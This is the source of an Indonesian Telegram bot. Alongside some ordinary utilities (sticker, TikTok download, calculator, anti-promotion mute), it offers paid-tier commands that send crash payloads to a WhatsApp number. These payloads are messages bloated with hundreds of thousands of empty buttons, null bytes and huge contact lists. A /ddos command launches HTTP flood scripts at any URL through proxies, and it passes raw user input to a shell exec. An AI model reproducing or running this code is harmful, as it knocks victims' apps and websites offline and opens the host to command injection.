bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});
bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

const formatUserInfo = (user, chat) => {
  const lines = [
    `👤 *Info User*`,
    ``,
    `🆔 *User ID:* \`${user.id}\``,
    `👤 *Nama:* ${user.first_name}${user.last_name ? " " + user.last_name : ""}`,
    `🔖 *Username:* ${user.username ? "@" + user.username : "_(tidak ada)_"}`,
    `🤖 *Bot:* ${user.is_bot ? "Ya" : "Tidak"}`,
    `🌐 *Bahasa:* ${user.language_code || "_(tidak diketahui)_"}`,
    ``,
    `💬 *Info Chat*`,
    ``,
    `🆔 *Chat ID:* \`${chat.id}\``,
    `📌 *Tipe Chat:* ${chat.type}`,
  ];

  if (chat.title) lines.push(`📛 *Judul Grup:* ${chat.title}`);
  if (chat.username) lines.push(`🔖 *Username Grup:* @${chat.username}`);

  return lines.join("\n");
};

bot.command("info", (ctx) => {
  ctx.replyWithMarkdown(formatUserInfo(ctx.from, ctx.chat));
});


bot.command("iqc", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|SennJmbud",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Senn Offc ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command('kalkulator', (ctx) => {
    const input = ctx.message.text.split(' ').slice(1).join(' '); // Ambil angka setelah command
    
    if (!input) {
        return ctx.reply('⚠️ Masukkan angkanya Fi! Contoh: /kalkulator 5 x 5');
    }

    try {
        // Kita ubah simbol 'x' jadi '*' dan ':' jadi '/' supaya dimengerti sistem
        let formatMath = input
            .replace(/x/gi, '*')
            .replace(/:/g, '/')
            .replace(/,/g, '.'); // Biar bisa hitung desimal pake koma

        // Hanya izinkan angka dan simbol matematika (Keamanan agar tidak disisipi kode jahat)
        if (/[^0-9\+\-\*\/\(\)\. ]/g.test(formatMath)) {
            return ctx.reply('❌ Karakter tidak valid! Cuma bisa angka dan simbol + - x :');
        }

        // Hitung hasilnya
        const hasil = eval(formatMath);

        // Kirim jawaban ke user
        ctx.reply(`📊 *Hasil Perhitungan:*\n\n${input} = *${hasil}*`, { parse_mode: 'Markdown' });

    } catch (err) {
        ctx.reply('❌ Format salah! Pastiin angkanya bener ya. Contoh: /kalkulator 10 x 2');
    }
});
//FUNCTIONBUG
async function mbutnew(sock, target) {
    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "Rexzy" },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 9000 }, () => ({}))
                    },
                },
                quotedMessage: {
                    contactsArrayMessage: {
                        displayName: "\u20D3\u20D3".repeat(9999),
                        contacts: Array.from({ length: 35000 }, (_, n) => ({
                            displayName: "\u20D3Maklu" + (n + 1),
                            vcard: "BEGIN:VCARD\n" +
                                "VERSION:3.0\n" +
                                "FN:XRyyModeIpong" + (n + 1) + "\n" +
                                "TEL;type=CELL;type=VOICE;waid=6281248620184" + n + ":+62 812-4862-0284" + n + "\n" +
                                "END:VCARD"
                        }))
                    }
                },
            },
        },
    };
    await sock.relayMessage(target, msg1, {});

}

async function iosdelay(tvive, target) {
  // 1. PERBAIKAN: Menambahkan definisi variabel 'floods' di dalam fungsi
  const floods = 5; // Ubah angka 5 sesuai jumlah spam yang diinginkan

  let message = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "</aether sange kontol",
            format: "DEFAULT",
            ephemeralExpiration: 0,
            forwardingScore: 999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
              "#" +
              Math.floor(Math.random() * 16777215)
                .toString(16)
                .padStart(6, "0")
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(40000),
            version: 3,
            entryPointConversionSource: "call_permission_message"
          }
        }
      }
    }
  };

  // 2. PERBAIKAN: Mengganti 'xit' menjadi 'sock' (atau nama koneksi utama bot kamu)
  const msg = await generateWAMessageFromContent(target, message, {
    userJid: sock.user.id 
  });

  await tvive.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
  
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    // 'floods' sekarang sudah terdefinisi di atas
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  await sock.relayMessage(target, {
    contactsArrayMessage: {
      displayName: "‼️⃟ ༚ tolol lu yatim" + "𑇂𑆵𑆴𑆿".repeat(60000),
      contacts: [
        {
          displayName: "‼️⃟ ༚ tolol lu yatim",
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;aether ganteng;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        },
        {
          displayName: "‼️⃟ ༚ tolol lu yatim",
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;aether ganteng;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        }
      ],
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        mentionedJid: mentionedJids, 
        quotedAd: {
          advertiserName: "x",
          mediaType: "IMAGE",
          jpegThumbnail: null,
          caption: "x"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: { jid: target } });
}

async function makluInvis(sock, target) {
  for (let loop = 0; loop < 5; loop++) {
    const maklu = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "\u0000".repeat(50000)
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 300000 }, () => ({})),
              name: "crash_" + loop,
              buttonpramsjson: JSON.stringify({
                flow_action: "navigate",
                flow_cta: "X".repeat(15000)
              })
            }
          }
        }
      }
    };

    const memek2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "A".repeat(70000) + "\u200b".repeat(70000)
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 400000 }, () => ({})),
              name: "mega_crash_" + loop,
              buttonpramsjson: JSON.stringify({
                flow_action: "navigate",
                flow_cta: "꧀".repeat(20000)
              })
            }
          }
        }
      }
    };

    const maklu3 = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "\u0006".repeat(60000)
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({})),
              name: "ultra_crash_" + loop,
              buttonpramsjson: JSON.stringify({
                flow_action: "navigate",
                flow_cta: "ꦾ".repeat(25000)
              })
            }
          }
        }
      }
    };

    const memek3 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "B".repeat(80000) + "\u200b".repeat(80000)
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 600000 }, () => ({})),
              name: "god_crash_" + loop,
              buttonpramsjson: JSON.stringify({
                flow_action: "navigate",
                flow_cta: "\uFFFF".repeat(30000)
              })
            }
          }
        }
      }
    };

    await sock.relayMessage(target, maklu, {});
    await sock.relayMessage(target, memek2, {});
    await sock.relayMessage(target, maklu3, {});
    await sock.relayMessage(target, memek3, {});
  }
}

async function delayhard(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          title: "\u0000",
          body: {
            text: "\uFFFF"
          },
          nativeFlowMessage: {
            buttons: "\t".repeat(500000)
          }
        }
      },
      participant: target
    }
  };

  await sock.relayMessage(target, msg, {});
}

async function xovaliaum(sock, target) {
  for (let i = 0; i < 2; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: " fvck xakaoffcial. " },
            nativeFlowMessage: {
              buttons: "\n".repeat(300000)
            }
          }
        }
      }
    }, { participant: true });
    await sleep(1500);
  }
}
//FORCE CLOSE NEW 
async function GrenXx(sock, target) {
  const OPTS = {};
  let sent = 0;

  const Gren = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "GrenXHarimau" + "\0".repeat(20000)
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            quotedMessage: {
              richResponseMessage: {}
            }
          }
        }
      }
    }
  };

  try {
    
    await sock.relayMessage('status@broadcast', Gren, {
      ...OPTS,
      messageId: 'gx-' + Date.now().toString(36).toUpperCase(),
      statusJidList: [target],
      noSelfSync: true,
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{ tag: 'to', attrs: { jid: target }, content: [] }]
        }]
      }]
    });

    await sock.relayMessage('status@broadcast', {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              title: "\u0070".repeat(50000),
              subtitle: "\x10".repeat(50000),
              bloksWidget: {
                uuid: "\u200B".repeat(50000),
                data: "[".repeat(50001),
                render: "[".repeat(20000),
                type: "\u200F".repeat(50000),
                fallback: "\u200D".repeat(50000)
              }
            },
            body: { text: "" },
            nativeFlowMessage: {
              buttons: "[[[[[[".repeat(50000)
            }
          }
        }
      }
    }, {
      messageId: 'gx2-' + Date.now().toString(36).toUpperCase(),
      statusJidList: [target],
      noSelfSync: true,
      participant: { jid: target },
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{ tag: 'to', attrs: { jid: target }, content: [] }]
        }]
      }]
    });
  } catch (err) {
    console.error(`error bro fix sendiri lu kan dev: ${err.message}`);
  }
}
//combo 
async function fcinvis(sock, target) {
  for (let i = 0; i <= 5; i++) {
    await xxx(sock, target)
    await sleep(20000) 
    await ForceInfinity(sock, target)
    await sleep(10000) 
    await mahenpler1(sock, target)
    await sleep(10000) 
    await mahenpler(sock, target)   
    await sleep(15000)
  }
}
//////// -- CASE BUG BIASA --- \\\\\\\\\\\
//DELLAY ONLY
bot.command("xspam", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✘ 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }],
        ]
      }
    }
  );

  withTargetLock(target, async () => {
    for (let i = 0; i < 1; i++) {
      try {
        await sendQueue.add(() => delayCanSpam(sock, target));
      } catch (e) {
        console.log(`[xspam] Gagal kirim ke-${i + 1}: ${e.message}`);
        break;
      }
    }
  }).catch(e => console.log(`[xspam] Lock error: ${e.message}`));
});

bot.command("xcrash", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xcrash 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✘ 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }],
        ]
      }
    }
  );

  withTargetLock(target, async () => {
    for (let i = 0; i < 1; i++) {
      try {
        await sendQueue.add(() => crashhh(sock, target));
      } catch (e) {
        console.log(`[xcrash] Gagal kirim ke-${i + 1}: ${e.message}`);
        break;
      }
    }
  }).catch(e => console.log(`[xcrash] Lock error: ${e.message}`));
});
//NOT SPAM
bot.command("hardcore", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkSpecialCooldown, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✘ 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }],
        ]
      }
    }
  );

  withTargetLock(target, async () => {
    for (let i = 0; i < 2; i++) {
      try {
        await sendQueue.add(() => crashhh(sock, target));
        await sleep(2000);
        await sendQueue.add(() => delayCanSpam(sock, target));
        
      } catch (e) {
        console.log(`[hardcore] Gagal kirim ke-${i + 1}: ${e.message}`);
        break;
      }
    }
  }).catch(e => console.log(`[hardcore] Lock error: ${e.message}`));
});

bot.command("core", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkSpecialCooldown, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✘ 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }],
        ]
      }
    }
  );

  withTargetLock(target, async () => {
    for (let i = 0; i < 2; i++) {
      try {
        await sendQueue.add(() => crashhh(sock, target));
        await sleep(2000);
        await sendQueue.add(() => crashhh(sock, target));
      } catch (e) {
        console.log(`[core] Gagal kirim ke-${i + 1}: ${e.message}`);
        break;
      }
    }
  }).catch(e => console.log(`[core] Lock error: ${e.message}`));
});
//FORCE CLOSE NEW
//spam
bot.command("forcex", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✘ 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }],
        ]
      }
    }
  );

  withTargetLock(target, async () => {
    for (let i = 0; i < 1; i++) {
      try {
        await sendQueue.add(() => BebasSpam(sock, target));
      } catch (e) {
        console.log(`[xspam] Gagal kirim ke-${i + 1}: ${e.message}`);
        break;
      }
    }
  }).catch(e => console.log(`[xspam] Lock error: ${e.message}`));
});
///////////////////////
bot.command("tes", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✘ 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }],
        ]
      }
    }
  );

  withTargetLock(target, async () => {
    for (let i = 0; i < 1; i++) {
      try {
        await sendQueue.add(() => EfcehBangReymon(sock, target));
      } catch (e) {
        console.log(`[xspam] Gagal kirim ke-${i + 1}: ${e.message}`);
        break;
      }
    }
  }).catch(e => console.log(`[xspam] Lock error: ${e.message}`));
});
//==============================================
////=========ANTI PROMOSI + AUTO MUTE========\\\\

const promoKeywords = [
  'join', 'gabung', 'promo', 'diskon', 'gratis', 'free',
  'klik', 'click', 'http://', 'https://', 't.me/', 'wa.me/',
  'bit.ly', 'linktr', 'invite', 'daftar', 'register', 'sell',
  'fs', 'forsell', 'apk bug', 'apk', 'minat', 'contact',
  'jual', 'beli', 'order', 'harga', 'murah', 'terjangkau',
  'channel', 'group', 'grup', 'bot baru', 'cek bio',
];

const PROMO_MUTE_DURATION_MS = 5 * 60 * 1000;

// Map userId → timestamp mute berakhir
const mutedPromo = new Map();

// Map groupId (string) → boolean
// true  = anti-promo AKTIF di group tersebut
// false = anti-promo MATI di group tersebut
// Jika groupId tidak ada di map → default MATI (harus dinyalakan manual)
const antiPromoGroups = new Map();

// ── Helper ──────────────────────────────────────────────────
function isPromoMessage(text) {
  if (!text) return false;
  const lower = text.toLowerCase();
  return promoKeywords.some(k => lower.includes(k));
}

async function isGroupAdmin(ctx, userId) {
  try {
    const member = await ctx.telegram.getChatMember(ctx.chat.id, userId);
    return ['administrator', 'creator'].includes(member.status);
  } catch {
    return false;
  }
}

// ── Command: /antipromo on|off|status  (Owner & admin group) ─
bot.command('antipromo', async (ctx) => {
  // Hanya berlaku di group
  if (ctx.chat?.type === 'private') {
    return ctx.reply('⚠️ Command ini hanya bisa digunakan di dalam group.');
  }

  const userId = ctx.from.id.toString();
  const groupId = ctx.chat.id.toString();

  // Hanya owner atau admin group yang boleh
  const isOwnerUser = isOwner(userId);
  const isAdmin = await isGroupAdmin(ctx, ctx.from.id);
  if (!isOwner && !isAdmin) {
    return ctx.reply('⛔ Hanya owner atau admin group yang bisa menggunakan command ini.');
  }

  const arg = (ctx.message.text.split(' ')[1] || '').toLowerCase();
  const groupTitle = ctx.chat.title || groupId;

  if (arg === 'on') {
    antiPromoGroups.set(groupId, true);
    return ctx.reply(
      `✅ *Anti-Promo* telah *diaktifkan* di group ini!\n` +
      `🏠 Group: *${groupTitle}*\n\n` +
      `Setiap pesan promosi akan dihapus & pengirim di-mute 5 menit.`,
      { parse_mode: 'Markdown' }
    );
  } else if (arg === 'off') {
    antiPromoGroups.set(groupId, false);
    return ctx.reply(
      `🔕 *Anti-Promo* telah *dinonaktifkan* di group ini!\n` +
      `🏠 Group: *${groupTitle}*`,
      { parse_mode: 'Markdown' }
    );
  } else {
    // Tampilkan status
    const isActive = antiPromoGroups.get(groupId) === true;
    const status = isActive ? '🟢 *ON*' : '🔴 *OFF*';
    return ctx.reply(
      `ℹ️ Status Anti-Promo di *${groupTitle}*: ${status}\n\n` +
      `Gunakan:\n` +
      `• \`/antipromo on\` — aktifkan di group ini\n` +
      `• \`/antipromo off\` — nonaktifkan di group ini`,
      { parse_mode: 'Markdown' }
    );
  }
});

// ── Middleware: Anti promosi per group ──────────────────────
bot.use(async (ctx, next) => {
  if (!ctx.message?.text) return next();
  if (ctx.chat?.type === 'private') return next();

  const groupId = ctx.chat.id.toString();

  // Cek apakah anti-promo aktif di group ini
  // Default: MATI → harus dinyalakan manual per group
  if (antiPromoGroups.get(groupId) !== true) return next();

  const userId = ctx.from.id.toString();

  // Owner & admin group bebas
  if (userId === OWNER_IDS.toString()) return next();
  const isAdmin = await isGroupAdmin(ctx, ctx.from.id);
  if (isAdmin) return next();

  const text = ctx.message.text;
  if (!isPromoMessage(text)) return next();

  const username = ctx.from.username ? `@${ctx.from.username}` : `#${userId}`;
  const fullName = `${ctx.from.first_name || ''}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`.trim();
  const muteStart = new Date();
  const muteEnd = new Date(Date.now() + PROMO_MUTE_DURATION_MS);

  mutedPromo.set(userId, muteEnd.getTime());

  // Hapus pesan promosi
  try {
    await ctx.deleteMessage();
  } catch (e) {
    console.error('Gagal hapus pesan:', e.message);
  }

  // Mute di group via Telegram API
  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, ctx.from.id, {
      permissions: {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
      },
      until_date: Math.floor(muteEnd.getTime() / 1000),
    });
  } catch (e) {
    console.error('Gagal mute:', e.message);
  }

  const logMessage =
    `\`\`\`javascript\n` +
    `┏━━━〔 ✞ 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 ✞ 〕━━━┓\n` +
    `   >> ANTI PROMOSI — AUTO MUTE <<\n` +
    `┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
    `╭───〔 𝐋𝐎𝐆 𝐈𝐍𝐅𝐎 〕───╮\n` +
    `│ ◈ USER    : ${username}\n` +
    `│ ◈ NAMA    : ${fullName}\n` +
    `│ ◈ USER ID : ${userId}\n` +
    `│ ◈ GROUP   : ${ctx.chat.title || '-'}\n` +
    `│ ◈ PESAN   : ${text.slice(0, 50)}...\n` +
    `│ ◈ MUTE    : 5 Menit\n` +
    `│ ◈ MULAI   : ${formatDateTime(muteStart)}\n` +
    `│ ◈ BEBAS   : ${formatDateTime(muteEnd)}\n` +
    `╰──────────────────────╯\n` +
    `\`\`\``;

  // Log ke OWNER
  try {
  await ctx.telegram.sendPhoto(OWNER_ID, 'https://files.catbox.moe/hd29if.jpg', {
    caption: logMessage,
    parse_mode: 'Markdown'
  });
} catch (e) {
  console.error('Gagal kirim log owner:', e.message);
}

  // Log ke GROUP LOG
if (LOG_GROUP_ID) {
  try {
    await ctx.telegram.sendPhoto(LOG_GROUP_ID, 'https://files.catbox.moe/hd29if.jpg', {
      caption: logMessage,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('Gagal kirim log group:', e.message);
  }
}

  // Notif di group
  await ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
    caption:
      `🚫 *${fullName}* terdeteksi mengirim *pesan promosi* dan telah di-mute!\n\n` +
      `⏰ *Mulai* : ${formatDateTime(muteStart)}\n` +
      `✅ *Bebas* : ${formatDateTime(muteEnd)}`,
    parse_mode: 'Markdown'
  });

  return;
});

bot.command('addpromo', async (ctx) => {
  if (!isOwner(ctx.from.id)) {
  return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
}
  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
  if (!args) return ctx.reply('⚠️ Contoh: /addpromo kata_promo');
  if (promoKeywords.includes(args)) return ctx.reply('⚠️ Keyword sudah ada!');
  promoKeywords.push(args);
  await ctx.reply(`✅ Keyword *${args}* berhasil ditambahkan!`, { parse_mode: 'Markdown' });
});

bot.command('delpromo', async (ctx) => {
  if (!isOwner(ctx.from.id)) {
  return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
}
  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
  if (!args) return ctx.reply('⚠️ Contoh: /delpromo kata_promo');
  const idx = promoKeywords.indexOf(args);
  if (idx === -1) return ctx.reply('⚠️ Keyword tidak ditemukan!');
  promoKeywords.splice(idx, 1);
  await ctx.reply(`✅ Keyword *${args}* berhasil dihapus!`, { parse_mode: 'Markdown' });
});

bot.command('listpromo', async (ctx) => {
  if (!isOwner(ctx.from.id)) {
  return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
}
  const list = promoKeywords.map((k, i) => `${i + 1}. ${k}`).join('\n');
  await ctx.reply(`📋 *Daftar Keyword Promosi:*\n\n${list}`, { parse_mode: 'Markdown' });
});

bot.command('unmute', async (ctx) => {
  if (!isOwner(ctx.from.id)) {
  return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
}
  const target = ctx.message.reply_to_message;
  if (!target) return ctx.reply('⚠️ Reply pesan user yang mau di-unmute!');

  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, target.from.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
      },
    });
    mutedPromo.delete(target.from.id.toString());
    await ctx.reply(`✅ *${target.from.first_name}* berhasil di-unmute!`, { parse_mode: 'Markdown' });
  } catch (e) {
    await ctx.reply('❌ Gagal unmute: ' + e.message);
  }
});

bot.command('ddos', checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const input = ctx.message.text.substring(6).trim().split(/\s+/); 

  const target = input[0];
  const time = input[1];
  const methods = input[2];

  if (!target || !time || !methods) {
    return ctx.reply(
      "Contoh Penggunaan:\n/ddos https://example.com 60 pidoras",
      { parse_mode: "HTML" }
    );
  }
await ctx.telegram.sendPhoto(ctx.chat.id, randomImages, {
    caption: `
<blockquote>(  ∞  )  𝕽 𝕬 𝕱 𝕬 𝕰 𝕷</blockquote>
𖤓 Target: ${target}
𖤓 Time: ${time}
𖤓 Metode: ${methods}`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check Target", url: `https://check-host.net/check-http?host=${target}` }
      ]]
    }
  });

  if (methods === "strike") {
    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
  } else if (methods === "mix") {
    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "flood") {
    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "h2vip") {
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "h2") {
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
  } else if (methods === "pidoras") {
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else {
    ctx.reply("❌ Metode tidak dikenali atau format salah.");
  }
});
///=== comand blockcmd ===\\\
// ===============================
// BLOCK CMD GROUP - TELEGRAF
// ===============================

